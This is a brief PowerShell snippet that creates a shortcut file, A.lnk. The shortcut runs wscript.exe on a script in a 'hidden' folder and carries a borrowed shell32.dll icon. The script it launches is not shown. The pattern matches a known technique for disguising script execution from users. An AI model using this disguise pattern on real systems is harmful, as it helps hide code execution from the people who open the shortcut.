$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut("A.lnk")
$shortcut.TargetPath = "wscript.exe"
$shortcut.Arguments = "hidden\A.vbs"
$shortcut.WorkingDirectory = ".\"
$shortcut.IconLocation = "shell32.dll,34"
$shortcut.Save()
